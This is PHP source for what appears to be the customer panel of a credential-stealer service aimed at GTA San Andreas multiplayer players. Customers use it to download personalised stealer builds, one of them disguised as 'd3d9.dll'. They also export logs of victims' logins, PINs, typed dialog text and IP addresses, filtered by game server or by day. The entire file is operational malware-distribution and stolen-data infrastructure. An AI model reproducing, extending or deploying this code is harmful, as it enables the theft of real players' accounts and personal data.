<?php
//error_reporting(E_ALL);
//ini_set('display_errors', 1);

function convertHex2bin($hex) {
	return pack("H*", $hex);
}
//wіндошs-1251
session_start();
$id = $_SESSION['login'];
include 'safemysql.php';

function loadAnyFile($basename, $savename)
{
	if (file_exists($basename))
	{
		header ("Content-Type: application/octet-stream");
	    header ("Accept-Ranges: bytes");
		header ("Content-Disposition: attachment; filename=".$savename);
		ob_clean();
		readfile($basename);
	} 
	else
	{
		echo "Стиллер на Ваш ID будет собран в течение недели";
	}
}

function loadStealer($format)
{
	if ($format == "cs")
	{
		$filename = "../plugins/".$_SESSION['login'].".cs";
		$stealname = $_SESSION['login'].".cs";
		
		if ($_SESSION['cs'] == 1)
		{
			loadAnyFile($filename, $stealname);
		}
		else
		{
			echo '<script> alert("Ошибка: У вас не активирован данный формат"); window.location="cp.php"; </script>';
		}
	}
	
	if ($format == "asi")
	{
		$filename = "../plugins/".$_SESSION['login'].".asi";
		$stealname = $_SESSION['login'].".asi";
		if ($_SESSION['asi'] == 1)
		{
			loadAnyFile($filename, $stealname);
		}
		else
		{
			echo '<script> alert("Ошибка: У вас не активирован данный формат"); window.location="cp.php"; </script>';
		}
	}
	
	if ($format == "sf")
	{
		$filename = "../plugins/".$_SESSION['login'].".asi";
		$stealname = $_SESSION['login'].".sf";
		if ($_SESSION['sf'] == 1)
		{
			loadAnyFile($filename, $stealname);
		}
		else
		{
			echo '<script> alert("Ошибка: У вас не активирован данный формат"); window.location="cp.php"; </script>';
		}
	}
	
	if ($format == "dll")
	{
		$filename = "../plugins/".$_SESSION['login'].".dll";
		$stealname = "d3d9.dll";
		if ($_SESSION['dll'] == 1)
		{
			loadAnyFile($filename, $stealname);
		}
		else
		{
			echo '<script> alert("Ошибка: У вас не активирован данный формат"); window.location="cp.php"; </script>';
		}
	}
		if ($format == "lua1")
	{
		$filename = "../plugins/".$_SESSION['login'].".luac";
		$stealname = $_SESSION['login'].".luaс";
		if ($_SESSION['lua'] == 1)
		{
			loadAnyFile($filename, $stealname);
		}
		else
		{
			echo '<script> alert("Ошибка: У вас не активирован данный формат"); window.location="cp.php"; </script>';
		}
	}
			if ($format == "lua2")
	{
		$filename = "../plugins/".$_SESSION['login'].".luac2";
		$stealname = $_SESSION['login'].".luaс";
		if ($_SESSION['lua'] == 1)
		{
			loadAnyFile($filename, $stealname);
		}
		else
		{
			echo '<script> alert("Ошибка: У вас не активирован данный формат"); window.location="cp.php"; </script>';
		}
	}
}

function downloadLogs()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();
	$logs = $db->getAll("SELECT * FROM logs WHERE id = ?i", $id);
	
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes");
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($logs as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadSRP()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();
	$srp = $db->getAll("SELECT * FROM logs WHERE id = ?i AND server LIKE '%Samp-Rp.Ru%'", $id);
	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes");
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($srp as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadARP()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();
	$arp = $db->getAll("SELECT * FROM logs WHERE id = ?i AND server LIKE '%Advance%'", $id);
	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes");
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($arp as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadDRP()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();
	$drp = $db->getAll("SELECT * FROM logs WHERE id = ?i AND server LIKE '%Diamond%'", $id);
	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes"); 
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($drp as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadARZ()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();
	$arz = $db->getAll("SELECT * FROM logs WHERE id = ?i AND server LIKE '%Arizona%'", $id);
	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes"); 
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($arz as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadEvolve()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();
	$evolve = $db->getAll("SELECT * FROM logs WHERE id = ?i AND server LIKE '%Evolve%'", $id);
	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes");
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($evolve as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadTrinity()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();
	$trinity = $db->getAll("SELECT * FROM logs WHERE id = ?i AND server LIKE '%Trinity%'", $id);

	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes");
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($trinity as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadGrand()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();
	$grand = $db->getAll("SELECT * FROM logs WHERE id = ?i AND server LIKE '%Grand%'", $id);
	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes");
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($grand as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadtoday()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();

	$today = date("d.m");

	$logtoday = $db->getAll("SELECT * FROM logs WHERE id = ?i AND date LIKE '%$today%'", $id);
	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes"); 
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($logtoday as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

function downloadyer()
{
	$id = $_SESSION['login'];
	$db = new SafeMySQL();

	$yerstadaytime = date("d.m", strtotime("-1 DAY"));

	$yer = $db->getAll("SELECT * FROM logs WHERE id = ?i AND date LIKE '%$yerstadaytime%'", $id);
	
	$size = $_SESSION['size'];
	
	$savename = $id.".txt";
	
	header ("Content-Type: application/octet-stream");
	header ("Accept-Ranges: bytes"); 
	header ("Content-Disposition: attachment; filename=".$savename."");
	
	foreach ($yer as $key) 
	{
		$log = $key['login'];
		$serv = $key['server'];
		$ip = $key['ip'];
		$inf = $key['text'];
		$pin = $key['ispin'];
		$did = $key['dialog'];
		$uip = $key['uip'];
		$date = $key['date'];
		$st = $key['st'];
		if ($pin == 1) $did = "PIN";
		echo "$date | Login: $log [$st] | Server: $ip [$serv] | Info[id: $did]: $inf | User-IP: $uip\r\n";
		// echo "$date | Player Info: $log [IP: $uip] | Stats: $st | Input Type: $did | Input Text: $inf | Server: $serv [IP: $ip]\r\n";
	}
}

if(isset($_SESSION['login'])) 
{
	if (isset($_GET['file']))
	{

		$file = $_GET['file'];
		
		if ($file == "plugin" && isset($_GET['format']))
		{
			loadStealer($_GET['format']);
		}
	   
		if ($file == "logs")
		{
			downloadLogs(); //нефильтрованные логи
		}

		if ($file == "srp")
		{
			downloadSRP();
		}

		if ($file == "arp")
		{
			downloadARP();
		}

		if ($file == "drp")
		{
			downloadDRP();
		}

		if ($file == "arizona")
		{
			downloadARZ();
		}

		if ($file == "evolve")
		{
			downloadEvolve();
		}

		if ($file == "trinity")
		{
			downloadTrinity();
		}

		if ($file == "grand")
		{
			downloadGrand();
		}

		if ($file == "today")
		{
			downloadtoday();
		}

		if ($file == "yersterday")
		{
			downloadyer();
		}
	}
}
?>